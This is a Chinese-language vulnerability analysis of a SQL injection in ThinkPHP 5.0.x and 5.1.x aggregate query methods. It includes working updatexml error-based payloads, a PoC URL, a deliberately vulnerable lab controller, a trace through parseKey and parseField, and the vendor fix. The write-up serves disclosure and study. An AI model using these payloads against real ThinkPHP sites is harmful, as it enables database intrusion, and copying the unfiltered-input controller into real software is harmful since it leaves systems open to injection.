<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>5.0.0 &lt;= Thinkphp &lt;= 5.0.21 &amp; 5.1.3&lt;=ThinkPHP5&lt;=5.1.25</h1><h2>一、漏洞简介</h2><p>本篇文章，将分析 <strong>ThinkPHP</strong> 中存在的 <strong>SQL注入</strong> 漏洞（所有 <strong>Mysql</strong> 聚合函数相关方法均存在注入）。本次漏洞存在于所有 <strong>Mysql</strong> 聚合函数相关方法。由于程序没有对数据进行很好的过滤，直接将数据拼接进 <strong>SQL</strong> 语句，最终导致 <strong>SQL注入漏洞</strong> 的产生。</p><h2>漏洞概要</h2><h2>二、漏洞影响</h2><p>5.0.0&lt;=ThinkPHP&lt;=5.0.21</p><p>5.1.3&lt;=ThinkPHP5&lt;=5.1.25</p><h2>三、复现过程</h2><p>不同版本 <strong>payload</strong> 需稍作调整：</p><p> <strong>5.0.0~5.0.21</strong> 、 <strong>5.1.3～5.1.10</strong> ：</p><p>id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</p><p><strong>5.1.11～5.1.25</strong> ：</p><p>id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</p><h2>漏洞环境</h2><p>通过以下命令获取测试环境代码：</p><p>composer create-project --prefer-dist topthink/think=5.1.25 tpdemo</p><p>将 <strong>composer.json</strong> 文件的 <strong>require</strong> 字段设置成如下：</p><p>"require": {<br />    "php": "&gt;=5.6.0",<br />    "topthink/framework": "5.1.25"<br />},</p><p>然后执行 composer update ，并将 <strong>application/index/controller/Index.php</strong> 文件代码设置如下：</p><p>&lt;?php<br />namespace app\index\controller;<br /><br />class Index<br />{<br />    public function index()<br />    {<br />        $options = request()-&gt;get('options');<br />        $result = db('users')-&gt;max($options);<br />        var_dump($result);<br />    }<br />}</p><p>在 <strong>config/database.php</strong> 文件中配置数据库相关信息，并开启 <strong>config/app.php</strong> 中的 <strong>app_debug</strong> 和 <strong>app_trace</strong> 。创建数据库信息如下：</p><p>create database tpdemo;<br />use tpdemo;<br />create table users(<br />    id int primary key auto_increment,<br />    username varchar(50) not null<br />);<br />insert into users(id,username) values(1,'Mochazz');<br />insert into users(id,username) values(2,'Jerry');<br />insert into users(id,username) values(3,'Kitty');</p><h3>poc</h3><p>http://localhost:8000/index/index/index?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</p><p>访问链接，即可触发 <strong>SQL注入漏洞</strong> 。（没开启 <strong>app_debug</strong> 是无法看到 <strong>SQL</strong> 报错信息的）</p><p>1.png</p><h3>漏洞分析</h3><p>首先在官方发布的 <strong>5.1.26</strong> 版本更新说明中，发现其中提到该版本包含了一个安全更新。</p><p>2.png</p><p>我们可以查阅其 <strong>commit</strong> 记录，发现其改进了数据库驱动，代码中多了检测特殊字符的片段。接下来我们直接来分析代码。</p><p>3.png</p><p>首先，用户可控数据未经过滤，传入 <strong>Query</strong> 类的 <strong>max</strong> 方法进行聚合查询语句构造，接着调用本类的 <strong>aggregate</strong> 方法。本次漏洞问题正是发生在该函数底层代码中，所以所有调用该方法的聚合方法均存在 <strong>SQL注入</strong> 问题。我们看到 <strong>aggregate</strong> 方法又调用了 <strong>Mysql</strong> 类的 <strong>aggregate</strong> 方法，在该方法中，我们可以明显看到程序将用户可控变量 <strong>$field</strong> ，经过 <strong>parseKey</strong> 方法处理后，与 <strong>SQL</strong> 语句进行了拼接。下面我们就来具体看看 <strong>parseKey</strong> 方法。</p><p>4.png</p><p><strong>parseKey</strong> 方法主要是对字段和表名进行处理，这里只是对我们的数据两端都添加了反引号。经过 <strong>parseKey</strong> 方法处理后，程序又回到了上图的 <strong>$this-&gt;value()</strong> 方法中，该方法会调用 <strong>Builder</strong> 类的 <strong>select</strong> 方法来构造 <strong>SQL</strong> 语句。这个方法应该说是在分析 <strong>ThinkPHP</strong> 漏洞时，非常常见的了。其无非就是使用 <strong>str_replace</strong> 方法，将变量替换到 <strong>SQL</strong> 语句模板中。这里，我们重点关注 <strong>parseField</strong> 方法，因为用户可控数据存储在 <strong>$options['field']</strong> 变量中并被传入该方法。</p><p>5.png</p><p>进入 <strong>parseField</strong> 方法，我们发现用户可控数据只是经过 <strong>parseKey</strong> 方法处理，并不影响数据，然后直接用逗号拼接，最终直接替换进 <strong>SQL</strong> 语句模板里，导致 <strong>SQL注入漏洞</strong> 的发生</p><p>6.png</p><h3>漏洞修复</h3><p>官方的修复方法是：当匹配到除了 <strong>字母、点号、星号</strong> 以外的字符时，就抛出异常。</p><p>3.png</p><h3>攻击总结</h3><p>最后，再通过一张攻击流程图来回顾整个攻击过程。</p><p>7.png</p><h2>参考链接</h2><p>https://github.com/Mochazz/ThinkPHP-Vuln</p></body></html>